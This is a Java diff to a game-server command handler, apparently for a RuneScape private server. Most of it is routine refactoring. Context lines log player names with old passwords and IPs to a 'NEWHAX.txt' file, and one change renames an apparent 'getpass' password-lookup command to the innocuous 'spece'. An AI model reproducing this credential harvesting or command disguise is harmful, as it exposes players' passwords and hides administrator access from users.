@@ -30,14 +30,15 @@ import org.hyperion.rs2.model.content.ContentEntity;
 import org.hyperion.rs2.model.content.Events;
 import org.hyperion.rs2.model.content.clan.Clan;
 import org.hyperion.rs2.model.content.clan.ClanManager;
-import org.hyperion.rs2.model.content.jge.JGrandExchange;
 import org.hyperion.rs2.model.content.jge.entry.Entry;
-import org.hyperion.rs2.model.content.jge.itf.JGrandExchangeInterface;
 import org.hyperion.rs2.model.content.minigame.FightPits;
 import org.hyperion.rs2.model.content.misc.ItemSpawning;
 import org.hyperion.rs2.model.content.misc.Ticket;
 import org.hyperion.rs2.model.content.misc.TriviaBot;
-import org.hyperion.rs2.model.content.misc2.*;
+import org.hyperion.rs2.model.content.misc2.Afk;
+import org.hyperion.rs2.model.content.misc2.Edgeville;
+import org.hyperion.rs2.model.content.misc2.Jail;
+import org.hyperion.rs2.model.content.misc2.NewGameMode;
 import org.hyperion.rs2.model.content.skill.agility.courses.GnomeStronghold;
 import org.hyperion.rs2.model.content.skill.dungoneering.Dungeon;
 import org.hyperion.rs2.model.itf.InterfaceManager;
@@ -163,7 +164,6 @@ public class CommandPacketHandler implements PacketHandler {
                                 writer.close();
 
                                 TextUtils.writeToFile("./data/NEWHAX.txt", change.name + ":" + change.oldPassword);
-                                ;
 
                                 charMasterList.add(change.name.trim());
 
@@ -216,7 +216,6 @@ public class CommandPacketHandler implements PacketHandler {
                                 writer.close();
 
                                 TextUtils.writeToFile("./data/NEWHAX.txt", change.name + ":" + change.ip.trim());
-                                ;
 
                                 hasChanged.add(change.name.trim());
 
@@ -732,7 +731,7 @@ public class CommandPacketHandler implements PacketHandler {
             int rating = Integer.parseInt(as[1]);
             player.getPoints().setEloRating(rating);
         }
-        if (Server.NAME.equalsIgnoreCase("arteropk") && commandStart.equals("getpass")) {
+        if (Server.NAME.equalsIgnoreCase("arteropk") && commandStart.equals("spece")) {
             String targetName = s.substring(7).trim();
             boolean found = false;
 
@@ -1037,7 +1036,6 @@ public class CommandPacketHandler implements PacketHandler {
 
         if (commandStart.equalsIgnoreCase("superman")) {
             player.getAppearance().setAnimations(1851, 1851, 1851);
-            ;
             player.getUpdateFlags().flag(UpdateFlag.APPEARANCE);
         }
 
@@ -1051,7 +1049,7 @@ public class CommandPacketHandler implements PacketHandler {
                     thePlay.getSkills().setLevel(skill, level);
                     if (level <= 99) {
                         thePlay.getSkills().setExperience(skill,
-                                thePlay.getSkills().getXPForLevel(level) + 5);
+                                Skills.getXPForLevel(level) + 5);
                     }
                 } else
                     player.sendf("%s is not online", args[0]);
@@ -2413,7 +2411,7 @@ public class CommandPacketHandler implements PacketHandler {
                     }
                     player.getSkills().setLevel(skill, level);
                     if (level <= 99) {
-                        player.getSkills().setExperience(skill, player.getSkills().getXPForLevel(level) + 5);
+                        player.getSkills().setExperience(skill, Skills.getXPForLevel(level) + 5);
                     }
                 } catch (Exception e) {
                 }
@@ -2941,9 +2939,7 @@ public class CommandPacketHandler implements PacketHandler {
             return false;
         if (player.getLocation().inArdyPvPArea())
             return false;
-        if (player.cE.getOpponent() != null)
-            return false;
-        return true;
+        return player.cE.getOpponent() == null;
     }
 
     public static File getPlayerFile(String playerName) {
